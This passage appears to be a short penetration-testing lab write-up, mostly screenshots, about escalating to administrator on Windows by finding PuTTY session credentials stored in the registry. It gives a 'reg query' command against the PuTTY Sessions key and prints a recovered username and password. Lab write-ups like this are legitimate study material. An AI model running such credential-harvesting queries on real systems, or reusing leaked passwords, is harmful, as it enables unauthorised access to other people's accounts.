![Pasted image 20260115005747.png](/ob/Pasted%20image%2020260115005747.png)

![Pasted image 20260115010216.png](/ob/Pasted%20image%2020260115010216.png)

![Pasted image 20260115012444.png](/ob/Pasted%20image%2020260115012444.png)

### offsec to admin (Registry Cred leak)

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-Putty" >}} Enumeration for PuTTY Credentials in Registry to find the admin password

{{< /toggle >}}

![Pasted image 20260115012619.png](/ob/Pasted%20image%2020260115012619.png)

```
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
```

![Pasted image 20260115012704.png](/ob/Pasted%20image%2020260115012704.png)\
zachary:h3R@tC@tch3r

![Pasted image 20260115013001.png](/ob/Pasted%20image%2020260115013001.png)

***
